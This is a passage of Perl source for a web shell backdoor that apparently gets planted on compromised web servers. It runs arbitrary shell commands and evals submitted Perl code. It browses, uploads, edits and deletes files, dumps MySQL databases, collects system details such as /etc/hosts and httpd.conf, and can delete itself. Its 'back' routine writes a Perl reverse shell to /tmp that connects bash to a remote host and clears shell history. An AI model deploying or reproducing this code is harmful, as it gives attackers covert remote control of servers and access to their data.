pre>";$Command="cd \"$CurrentDir\"".$CmdSep.$RunCommand.$Redirector;if(!$WinNT){$SIG{'ALRM'}=\&CommandTimeout;alarm($CommandTimeoutDuration);}if($ShowDynamicOutput){$|=1;$Command .=
 " |";open(CommandOutput, $Command);while(<CommandOutput>){$_ =~ s/(\n|\r\n)$//;print "$_\n";}$|=0;}else{print `$Command`;}if(!$WinNT){alarm(0);}print "</pre>";}print "</font>";&Pri
ntCommandLineInputForm;&PrintPageFooter;}sub SendFileToBrowser($){open (FILE, $_[0]);local ($/);$file=<FILE>;close (FILE);($f=$_[0])=~m!([^/^\\]*)$!;print "Content-type: application
/x-unknown\n";print "Content-Disposition: attachment;filename=".$1."\n";print "Content-Description: File to download\n\n";print $file;}sub SystemInfo{sub langs{$s="which gcc perl py
thon php tar zip";$s.=" -U $q{u}"if($q{u});return $s;}sub hdd{$s="df -h";$s.=" -U $q{u}"if($q{u});return $s;}sub hdd1{$s="mount";$s.=" -U $q{u}"if($q{u});return $s;}sub perlv{$s="pe
rl -v";$s.=" -U $q{u}"if($q{u});return $s;}sub phpv{$s="php -v";$s.=" -U $q{u}"if($q{u});return $s;}sub hosts{$s="cat /etc/hosts";$s.=" -U $q{u}"if($q{u});return $s;}sub downloaders
{$s="which lynx links wget GET fetch curl";$s.=" -U $q{u}"if($q{u});return $s;}sub httpd{$s="locate httpd.conf";$s.=" -U $q{u}"if($q{u});return $s;}$langs=langs();$httpd=httpd();$hd
d1=hdd1();$hdd=hdd();$perlv=perlv();$phpv=phpv();$hosts=hosts();$downloaders=downloaders();&PrintPageHeader("c");print "<h1>System information</h1>";print "$div$tab<td><span>HDD[mou
nt]:</span>$div";P(`$hdd1`);print "$dive</td><td><span>HDD[df -h]:</span>$div";P(`$hdd`);print "<tr><td><span>PATHS:</span>$div";P(`$langs`);print "$dive</td><td><span>DOWNLOADERS:<
/span>$div";P(`$downloaders`);print "$dive</td></tr><tr><td><span>PERL version:</span>$div";P(`$perlv`);print "$dive</td><td><span>PHP version:</span>$div";P(`$phpv`);print "$dive</
td></tr><tr><td><span>/etc/hosts:</span>$div";P(`$hosts`);print "$dive</td><td><span>httpd.conf:</span>$div";P(`$httpd`);print "$dive</td></tr>$tabe$dive";&PrintPageFooter;}sub sql_
loginform{print "<h1>DataBases manager</h1>";&GetCookies;$hhost=$Cookies{'hhost'};$pport=$Cookies{'pport'};$usser=$Cookies{'usser'};$passs=$Cookies{'passs'};$dbb=$Cookies{'dbb'};if(
!$hhost){$hhost='localhost'};if(!$pport){$pport='3306'};if(!$usser){$usser='root'};print <<END;
<form name='sf' method='post'><table cellpadding='2' cellspacing='0'><tr><td>Type</td><td>Host</td><td>Port</td><td>Login</td><td>Password</td><td>Database</td><td></td></tr><tr><td
><select name='type' id='nname'><option value='mysql' selected>MySql</option><option value='pgsql'>PostgreSql</option></select></td><td><input type=text name=sql_host value=$hhost><
/td><td><input type=text name=sql_port value=$pport></td><td><input type=text name=sql_login value=$usser></td><td><input type=text name=sql_pass value=$passs></td><td><input type=t
ext name=sql_db value=$dbb></td><input type="hidden" name="d" value="$CurrentDir"><input type="hidden" name="a" value="sql_connect"><td><input type=submit value='>>'></td></tr>$tabe
</form><br><script>document.getElementById('nname').focus();</script>
END
}sub sql{use DBI;&PrintPageHeader("p");sql_loginform();sql_query_form();&PrintVar;&PrintPageFooter;}sub sql_vars_set{$hhost=$in{'sql_host'};$pport=$in{'sql_port'};$usser=$in{'sql_lo
gin'};$passs=$in{'sql_pass'};$dbb=$in{'sql_db'};}sub sql_query_form{ print <<END;
$tab<td><span>Current query:</span></td><td><form name='querys' method='post'><textarea name='query' cols=70 style='width:100%;height:60px'>$zapros</textarea><br/><input type=submit
 value='Query'><input type="hidden" name="d" value="$CurrentDir"><input type="hidden" name="a" value="sql_query"></form></td>$tabe$tabe
END
}sub sql_cq_form{print <<END;
$tab<td><span>Get data from columns:</span></td><td><form name='cquerys' method='post'><textarea name='cquery' id='cquery' cols=40 style='width:100%;height:60px'></textarea><br/><in
put type="hidden" name="a" value="sql_query"><input type="hidden" name="d" value="$CurrentDir"><input type=submit value='Query'></form></td>
END
}sub sql_databases_form{print '<tr><form method=post name=dd'.$$ref[0].'><input type="hidden" name="a" value="sql_databases"><input type=hidden name=database value='.$$ref[0].'><inp
ut type="hidden" name="d" value="'.$CurrentDir.'"><td></font><font face="Verdana" size="1">['.$s4et.']</font></td><td><a href="javascript:document.dd'.$$ref[0].'.submit()"><font fac
e="Verdana" size="1">'.' '.$$ref[0].'</font></a></td></form></tr>';}sub sql_tables_form {print '<tr><form method=post name=tt'.$$ref[0].'><input type="hidden" name="a" value="sql_ta
bles"><input type=hidden name=table value='.$$ref[0].'><input type="hidden" name="d" value="'.$CurrentDir.'"><td></font><font face="Verdana" size="1">['.$s4et.']</font></td><td><a h
ref="javascript:document.tt'.$$ref[0].'.submit()"><font face="Verdana" size="1">'.' '.$$ref[0].'</font></a></td></form></tr>';}sub sql_columns_form{print '<script>function lol'.$s4e
t.'(f){if(f.checked){var cn=document.getElementById("cquery").value;if(cn!==""){document.cquerys.cquery.value=cn+","+f.id;}else{document.cquerys.cquery.value=f.id;}}else{exit;}}</sc
ript><tr><form method=post name=cc'.$$ref[0].'><input type="hidden" name="a" value="sql_columns"><input type=hidden name=column value='.$$ref[0].'><input type="hidden" name="d" valu
e="'.$CurrentDir.'">';print '<td></font><font face="Verdana" size="1">['.$s4et.']</font></td><td><input type=checkbox id='.$$ref[0].' name=c'.$$ref[0].' onClick="lol'.$s4et.'(this.f
orm.c'.$$ref[0].')"></td><td><a href="javascript:document.cc'.$$ref[0].'.submit()"><font face="Verdana" size="1">'.$$ref[0].'</font></a></td></form><tr>';}sub sql_data_form {print '
<tr><form method=post name=dt'.$$ref[0].'><input type="hidden" name="d" value="'.$CurrentDir.'"><td>'.$verd.'['.$s4et.'] </font></td><td>'.$verd.$$ref[0].'</font></td></form></tr>';
}sub NetPrint{&PrintPageHeader("p");NetForm();&PrintPageFooter;}sub NetForm {$rip = $ENV{'REMOTE_ADDR'};print <<END;
<h1>Back-connect  [perl]</h1><br/><form name='nfp' method=post>Server: <input type='text' name='server' value=$rip> Port: <input type='text' name='ppport' value=31337><input type="h
idden" name="a" value="net_go"><input type=submit value='>>'></form><br>
END
&PrintVar;}sub back{open(FILE,">/tmp/bbc.pl");$bbc='#!/usr/bin/perl use IO::Socket;$system="/bin/bash";use Socket;use FileHandle;socket(SOCKET,PF_INET,SOCK_STREAM,getprotobyname("tc
p")) or die print "[-] Unable to Resolve Host\n";connect(SOCKET,sockaddr_in("'.$port.'",inet_aton("'.$target.'"))) or die print "[-] Unable to Connect Host\n";SOCKET->autoflush();op
en(STDIN, ">&SOCKET");open(STDOUT,">&SOCKET");open(STDERR,">&SOCKET");system("unset HISTFILE;unset SAVEHIST;echo PPS 3.0 backconnect:;pwd;");system($system);';print FILE $bbc;close(
FILE);system("chmod 777 /tmp/bbc.pl;perl /tmp/bbc.pl $target $port");exit;}sub NetGo{&PrintPageHeader("c");$target=$in{'server'};$port=$in{'ppport'};NetForm();back();&PrintPageFoote
r;}sub EvalCodePrint{&PrintPageHeader("p");EvalCodeForm();&PrintPageFooter;}sub EvalCodeForm{print <<END;
<h1>Execution PERL-code</h1><form name=pf method=post><textarea name=code class=bigarea id=PerlCode></textarea><input type="hidden" name="a" value="eval_code"><input type=submit val
ue=Eval style="margin-top:5px">
END
}sub EvalCode{&PrintPageHeader("c");EvalCodeForm();$ccode=$in{'code'};print "<br>Result:<br>";eval $ccode;&PrintPageFooter;}sub EditFilePathForm {print <<END;
<code><br><form name=pfsd method=post>$Prompt<input type="text" name=path id=edit1_file><input type="hidden" name="a" value="edit_file_path"><input type="hidden" name="d" value="$Cu
rrentDir"><input type=submit value=MakeDir></form></code>
END
}sub EditFilePath{$fpath="";$fpath=$CurrentDir."/".$ViewF;EditFilePrint();}sub EditFilePrint{&PrintPageHeader("p");EditFileForm();&PrintPageFooter;}sub EditFileForm{open(FILE, $fpat
h);@file=<FILE>;$fccodde=HtmlSpecialChars(join('', @file));print '<h1>File tools:</h1>';&RTP_EDIT;print <<END;
<div class=content><form name=pf11 method=post><textarea name=ccode class=bigarea id=editfile>$fccodde</textarea><input type="hidden" name="a" value="edit_file"><input type=hidden n
ame=path value=$fpath><input type="hidden" name="d" value="$CurrentDir"><input type=submit value=Save style="margin-top:5px"></form></div>
END
&PrintVar;&PrintPageFooter;}sub ViewFile{$fpath=$CurrentDir."/".$ViewF;&PrintPageHeader("c");open(FILE,$fpath);@file=<FILE>;$fccodde=join('',@file);$fccodde=HtmlSpecialChars($fccodd
e);print '<h1>File tools:</h1>';&RTP_EDIT;print decode_base64("PHNjcmlwdD5mdW5jdGlvbiBjb2xvcihjb2RlKXt2YXIgcz1bXTt2YXIgYz0iJyI7cmV0dXJuIGNvZGUucmVwbGFjZSgvXGIoY2FzZXxjYXRjaHxjb250aW
51ZXxkb3xlbmRkb3xlbHNlfGVsaWZ8ZWxzZWlmfGlmZGVmfGlmbmRlZnxlbmRpZnxmb3J8Zm9yZWFjaHxpZnxmaXxzd2l0Y2h8dHJ5fHR5cGVvZnx3aGlsZXx3aXRofGJyZWFrfGluY2x1ZGV8cmVxdWlyZXxyZXF1aXJlX29uY2V8Zm9wZW5
8ZnB1dHN8ZnJlYWR8ZmlsZV9nZXRfY29udGVudHN8ZmlsZV9wdXRfY29udGVudHN8cHJlZ19yZXBsYWNlfGltcG9ydHxleGNlcHR8ZGVmaW5lfGRlZmluZWR8dW5kZWYpXGIvZ2ltLCc8c3Bhbj4kMTwvc3Bhbj4nKS5yZXBsYWNlKC8oe3x9
KS9naW0sJzxzcGFuPiQxPC9zcGFuPicpLnJlcGxhY2UoL1xiKGZ1bmN0aW9ufHN1YnxkZWZ8dm9pZHxpbnR8cmV0dXJufGV2YWx8YXNzZXJ0fGV4ZWNsfGV4ZWN2fGV4ZWN2ZXxleGVjfGV4ZWNwfGRpZVwoXCkpXGIvZ2ltLCc8Yj48Zm9ud
CBjb2xvcj0jMDBmZmZmPiQxPC9mb250PjwvYj4nKS5yZXBsYWNlKC9cYihzdHJ1Y3R8ZXhpdHxjbGFzc3xzeXN0ZW18cHJpbnR8cHJpbnRmfGVjaG98c3ByaW50ZnxmcHJpbnRmfHZhclxzKVxiL2dpbSwnPGI+JDE8L2I+JykucmVwbGFjZS
gvXGIoMHhbXGRhLXpdK3xcZCspXGIvZ2ltLCAnPGZvbnQgY29sb3I9I2ZmYTA3YT4kMTwvZm9udD4nKS5yZXBsYWNlKC8oXFx4W1xkYS16XSopL2dpbSwgJzxmb250IGNvbG9yPSNmZmEwN2E+JDE8L2ZvbnQ+JykucmVwbGFjZSgvXGIoaHR
0cFw6XC9cLypcLz98aHR0cHNcOlwvXC8qXC8/fGZ0cFw6XC9cLypcLz8pXGIvZ2ltLCc8dT48Zm9udCBjb2xvcj0jZmFmYWQyPiQxPC91PjwvZm9udD4nKS5yZXBsYWNlKC8oIi4qPyJ8Jy4qPycpL2csJzxmb250IGNvbG9yPSNmYWZhZDI+
JDE8L2ZvbnQ+JykucmVwbGFjZSgvKFwvXCouKlwqXC98XC9cLy4qKS9naW0sJzxmb250IGNvbG9yPSM2OTY5Njk+JDE8L2ZvbnQ+JykucmVwbGFjZSgvKFwvXCpbXHNcU10qP1wqXC8pL2dpbSwnPGZvbnQgY29sb3I9IzY5Njk2OT4kMTwvZ
m9udD4nKS5yZXBsYWNlKC8oXiMuKiQpL2dpbSwnPGI+PGZvbnQgY29sb3I9IzY5Njk2OT4kMTwvZm9udD48L2I+JykucmVwbGFjZSgvKFwkW19hLXowLTldKikvZ2ltLCc8Yj48Zm9udCBjb2xvcj0jOThmYjk4PiQxPC9mb250PjwvYj4nKS
5yZXBsYWNlKC88cihcZCspPi9naW0sZnVuY3Rpb24obWF0Y2gsaWQpe3ZhciByPXNbaWQtMV07dmFyIGNzcz1yLm1hdGNoKC9eKFwvXC98XC9cKnwtKS8pPydjb21tZW50JzpyLm1hdGNoKC9eWyYnXS8pPydzdHJpbmcnOidyZWdleHAnO3J
ldHVybiAnPHNwYW4gY2xhc3M9IicrY3NzKyciPicrcisnPC9zcGFuPic7fSl9O2Z1bmN0aW9uIGNoYW5nZVRleHQoKXt2YXIgYT1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnY2Njb2RlZScpLmlubmVySFRNTDthPWNvbG9yKGEpO2RvY3Vt
ZW50LmdldEVsZW1lbnRCeUlkKCdjY2NvZGVlJykuaW5uZXJIVE1MPWE7fTwvc2NyaXB0Pg==");
print"<div class=content><pre class=ml1 id='cccodee'>$fccodde</pre></div>";&PrintVar;&PrintPageFooter;}sub EditFile {&PrintPageHeader("c");$fccode=$in{'ccode'};$ffpath=$in{"path"};p
rint <<END;
<h1>File: $ffpath saved</h1><form name=pf11 method=post><textarea name=ccode class=bigarea id=editfile>$fccode</textarea><input type="hidden" name="a" value="filemanager"><niput typ
e=hidden name=path value=$ffpath><input type="hidden" name="ddd" value="$ViewF"><input type="hidden" name="d" value="$CurrentDir"><input type=submit value=Files style="margin-top:5p
x"></form>
END
open(FFF,"> $ffpath");print FFF DeHtmlSpecialChars($fccode);close(FFF);&PrintVar;&PrintPageFooter;}sub jquery{print '<script>document.querys.query.value="'.$zapros.'";</script>';}su
b sql_columns{&GetCookies;$hhost=$Cookies{'hhost'};$pport=$Cookies{'pport'};$usser=$Cookies{'usser'};$passs=$Cookies{'passs'};$dbb=$Cookies{'dbb'};$table=$Cookies{'table'};&PrintPag
eHeader("c");sql_vars_set();sql_loginform();$column=$in{'column'};print <<END;
<script>function setCookie(name,value,expires,path,domain,secure){document.cookie=name+"="+escape(value)+((expires)?";expires="+expires:"")+((path)?";path="+path:"")+((domain)?";dom
ain="+domain:"")+((secure)?";secure":"");}setCookie("column","$column","","/");</script>
END
print "$tbb$verd";$dbh=DBI->connect("DBI:mysql:$dbb:$hhost:$pport",$usser,$passs);$sth=$dbh->prepare("SHOW DATABASES");$sth->execute;print "<b>DATABASES:</b><br><td><table border=1
cellspacing=0 cellpadding=1>";while($ref=$sth->fetchrow_arrayref){$s4et++;sql_databases_form();}$rc=$sth->finish;print "$tabe</td><td>$tab<td>";$zapros="SHOW TABLES FROM $dbb";sql_c
q_form();print "</td><td>";sql_query_form();print "$tabe</td>$tabe";$s4et=0;$sth=$dbh->prepare($zapros);$sth->execute;print $tabe;print "<b>Tables from $dbb:</b><br><table border=1
cellspacing=0 cellpadding=1 cols=4><td><table border=1 cellspacing=0 cellpadding=1 cols=2>";while($ref=$sth->fetchrow_arrayref){$s4et++;sql_tables_form();}$rc=$sth->finish;print "$t
abe</td><td><table border=1 cellspacing=0 cellpadding=1 cols=2>";$s4et=0;$sth=$dbh->prepare("show columns from $table from $dbb");$sth->execute;while($ref=$sth->fetchrow_arrayref){$
s4et++;sql_columns_form();}$rc=$sth->finish;print "$tabe</td>";$s4et=0;$zapros="SELECT $column FROM `".$dbb."`.`".$table."` LIMIT 0,30";jquery();$sth=$dbh->prepare($zapros);$sth->ex
ecute;print "<td><table border=1 cellspacing=0 cellpadding=1 cols=2>";while($ref=$sth->fetchrow_arrayref){$s4et++;sql_data_form();}$rc=$sth->finish;$rc=$dbh->disconnect;print "$tabe
</td>$tabe";&PrintPageFooter;}sub sql_tables{&GetCookies;$hhost=$Cookies{'hhost'};$pport=$Cookies{'pport'};$usser=$Cookies{'usser'};$passs=$Cookies{'passs'};$dbb=$Cookies{'dbb'};&Pr
intPageHeader("c");sql_vars_set();sql_loginform();$qqquery=$in{'table'};print <<END;
<script>function setCookie(name,value,expires,path,domain,secure){document.cookie=name+"="+escape(value)+((expires)?";expires="+expires:"")+((path)?";path="+path:"")+((domain)?";dom
ain="+domain:"")+((secure)?";secure":"");}setCookie("table","$qqquery","","/");</script>
END
print "$tbb$verd";$dbh=DBI->connect("DBI:mysql:$dbb:$hhost:$pport",$usser,$passs);$sth=$dbh->prepare('SHOW DATABASES');$sth->execute;print "<b>DATABASES:</b><br><td><table border=1
cellspacing=0 cellpadding=1>";jquery();while($ref=$sth->fetchrow_arrayref){$s4et++;sql_databases_form();}$rc=$sth->finish;print "$tabe</td><td>$tab<td>";sql_cq_form();print "</td><t
d>";sql_query_form();print "</td>$tabe</td>$tabe";$s4et=0;$sth=$dbh->prepare("SHOW TABLES FROM $dbb");$sth->execute;print "<b>Tables from $dbb:</b><br><table border=1 cellspacing=0
cellpadding=1 cols=4><td><table border=1 cellspacing=0 cellpadding=1 cols=2>";while($ref=$sth->fetchrow_arrayref){$s4et++;sql_tables_form();}$rc=$sth->finish;print "$tabe</td><td><t
able border=1 cellspacing=0 cellpadding=1 cols=2>";$s4et=0;$zapros="SHOW COLUMNS FROM `$qqquery` FROM `$dbb`";jquery();$sth=$dbh->prepare($zapros);$sth->execute;while($ref=$sth->fet
chrow_arrayref){$s4et++;sql_columns_form();}$rc=$sth->finish;$rc=$dbh->disconnect;print "$tabe</td>$tabe";&PrintPageFooter;}sub sql_databases{sql_vars_set();&PrintPageHeader("c");sq
l_vars_set();sql_loginform();$ddb=$in{'database'};print <<END;
<script>function setCookie(name,value,expires,path,domain,secure){document.cookie=name+"="+escape(value)+((expires)?";expires="+expires:"")+((path)?";path="+path:"")+((domain)?";dom
ain="+domain:"")+((secure)?";secure":"");}setCookie("dbb","$ddb","","/");</script>
END
print "$tbb$verd";$dbh=DBI->connect("DBI:mysql:$dbb:$hhost:$pport",$usser,$passs);$sth = $dbh->prepare("SHOW DATABASES");$sth->execute;print "<b>DATABASES:</b><br><td><table border=
1 cellspacing=0 cellpadding=1>";while($ref=$sth->fetchrow_arrayref){$s4et++;sql_databases_form();}$rc=$sth->finish;print "$tabe</td><td>$tbb>";sql_query_form();print "$tabe</td>$tab
e";$s4et=0;$zapros="SHOW TABLES FROM `$ddb`";jquery();$sth=$dbh->prepare($zapros);$sth->execute;print "$tabe";print "<b>Tables from $ddb:</b><br>";print "<table border=1 cellspacing
=0 cellpadding=1 cols=10>";while($ref=$sth->fetchrow_arrayref){$s4et++;sql_tables_form();}$s4et=0;$rc=$sth->finish;$rc=$dbh->disconnect;print "$tabe";&PrintVar;&PrintPageFooter;}sub
 sql_set_cookie{print "Set-Cookie: hhost=$hhost;\n";print "Set-Cookie: pport=$pport;\n";print "Set-Cookie: usser=$usser;\n";print "Set-Cookie: passs=$passs;\n";print "Set-Cookie: db
b=$dbb;\n";}sub sql_query{sql_vars_set();&GetCookies;$hhost=$Cookies{'hhost'};$pport=$Cookies{'pport'};$usser=$Cookies{'usser'};$passs=$Cookies{'passs'};$dbb=$Cookies{'dbb'};$table=
$Cookies{'table'};&PrintPageHeader("c");sql_vars_set();sql_loginform();$qquery=$in{'cquery'};if($qquery){$qquery="SELECT CONCAT_WS(0x3a,$qquery) FROM `$dbb`.`$table` LIMIT 0,30";}el
se{$qquery=$in{'query'};}$dbh=DBI->connect("DBI:mysql:$dbb:$hhost:$pport",$usser,$passs);$sth=$dbh->prepare("SHOW DATABASES");$sth->execute;print "$verd<table width=100% cellspacing
=0 cellpadding=1 cols=2><b>DATABASES:</b><td><table border=1 cellspacing=0 cellpadding=1>";while($ref=$sth->fetchrow_arrayref){$s4et++;sql_databases_form();}$rc=$sth->finish;print "
$tabe</td><td>$tbb>";sql_query_form();print "$tabe</td>$tabe";$s4et=0;$sth=$dbh->prepare($qquery);$sth->execute;print "<b>Results:</b><br>";print "<table border=1 cellspacing=0 cell
padding=1 cols=10>";while($ref=$sth->fetchrow_arrayref){$s4et++;print "<tr><td>$verd [$s4et]</font></td><td>".$verd.$$ref[0]."</font></td></tr>";}$s4et=0;$rc=$sth->finish;$rc=$dbh->
disconnect;print "$tabe";print '<script>document.querys.query.value="'.$qquery.'";</script>';&PrintVar;&PrintPageFooter;}sub sql_connect{sql_vars_set();sql_set_cookie();&PrintPageHe
ader("c");sql_loginform();sql_vars_set();$s4et=0;$dbb="";$dbh=DBI->connect("DBI:mysql:$dbb:$hhost:$pport",$usser,$passs);if($hhost && $pport && $usser && $passs){$zapros="SHOW DATAB
ASES";jquery();$sth=$dbh->prepare($zapros);$sth->execute;print "$verd $tbb<b>DATABASES:</b><td><table border=1 cellspacing=0 cellpadding=1>";while($ref=$sth->fetchrow_arrayref){$s4e
t++;sql_databases_form();}$rc=$sth->finish;print "$tabe</td><td>";sql_query_form();print "</td>$tabe";$rc = $dbh->disconnect;print '</font>';return;}print "Some error...</font>";&Pr
intVar;&PrintPageFooter;}sub UploadFile{if($TransferFile eq ""){&PrintPageHeader("f");file_header();&PrintCommandLineInputForm;&PrintFileUploadForm;&PrintPageFooter;return;}&PrintPa
geHeader("c");file_header();print "<font size=1>Uploading $TransferFile to $CurrentDir...<br>";chop($TargetName) if($TargetName = $CurrentDir) =~ m/[\\\/]$/;$TransferFile =~ m!([^/^
\\]*)$!;$TargetName .= $PathSep.$1;$TargetFileSize = length($in{'filedata'});if(open(UPLOADFILE, ">$TargetName")){binmode(UPLOADFILE) if $WinNT;print UPLOADFILE $in{'filedata'};clos
e(UPLOADFILE);print "Transfered $TargetFileSize Bytes.<br>";print "File Path: $TargetName<br>";}else{print "Failed: $!<br>";}print "</font>";&PrintCommandLineInputForm;&PrintPageFoo
ter;}sub Remove{use Cwd qw(abs_path);my $path=abs_path($0);system("rm $path");}&ReadParse;&GetCookies;$ScriptLocation=$ENV{'SCRIPT_NAME'};$ServerName=$ENV{'SERVER_NAME'};$LoginPassw
ord=$in{'p'};$RunCommand=$in{'c'};$RunCommand2=$in{'l11'};if($RunCommand2){$RunCommand=$RunCommand2}$RunCommand1=$in{'aliases'};if($RunCommand1){$RunCommand=$RunCommand1}$RunCommand
2=$in{'group'};if($RunCommand2){$gr=$Cookies{'f'};$gre='';$gr=~s/\%([A-Fa-f0-9]{2})/pack('C',hex($1))/seg;@grr=split(/\s/,$gr);if($RunCommand2 eq "untar"){foreach $arg(@grr){if($arg
 ne '..'){$gre.="tar xfz $arg;"}}}if($RunCommand2 eq "tar"){foreach $arg(@grr){if($arg ne '..'){$arg1.=' '.$arg}}$gre="tar cfz z_$$.tar.gz".$arg1;}if($RunCommand2 eq "delete"){forea
ch $arg(@grr){if($arg ne '..'){$arg1.=' '.$arg}}$gre="rm -rf$arg1";}$RunCommand=$gre;}$ChangeDir=$in{'cc'};$ZipFile=$in{'zip'};$ZipArch=$in{'arh_name'};$UnZipArch=$in{'unzip_name'};
$DelFile=$in{'del_file'};$DelDir=$in{'del_dir'};$MkDir=$in{'md'};$ViewF=$in{'path'};$Fchmod=$in{'fchmod'};$Fdata=$in{'fdata'};$MakeFile=$in{'mf'};$TransferFile=$in{'f'};$Options=$in
{'o'};$Action=$in{'a'};$Action="filemanager" if($Action eq "");$CurrentDir=$in{'d'};chop($CurrentDir=`$CmdPwd`) if($CurrentDir eq "");$LoggedIn=$Cookies{'SAVEDPWD'} eq $Password;if(
$Action eq "login" || !$LoggedIn){&PerformLogin;}elsif($Action eq "command"){&ExecuteCommand;}elsif($Action eq "RT"){&RT;}elsif($Action eq "view_file"){&ViewFile;}elsif($Action eq "
command1"){&ExecuteCommand1;}elsif($Action eq "filemanager"){&FileManager;}elsif($Action eq "console"){&Console;}elsif($Action eq "upload"){&UploadFile;}elsif($Action eq "download")
{&SendFileToBrowser($CurrentDir."/".$TransferFile);}elsif($Action eq "systeminfo"){&SystemInfo;}elsif($Action eq "code"){&EvalCodePrint;}elsif($Action eq "eval_code"){&EvalCode;}els
if($Action eq "net"){&NetPrint;}elsif($Action eq "net_go"){&NetGo;}elsif($Action eq "sql"){&sql;}elsif($Action eq "sql_connect"){&sql_connect;}elsif($Action eq "sql_query"){&sql_que
ry;}elsif($Action eq "remove"){&Remove;}elsif($Action eq "edit_file"){&EditFile;}elsif($Action eq "edit_file_path"){&EditFilePath;}elsif($Action eq "sql_databases"){&sql_databases;}
elsif($Action eq "sql_tables"){&sql_tables;}elsif($Action eq "sql_columns"){&sql_columns;}elsif($Action eq "logout"){&PerformLogout;}
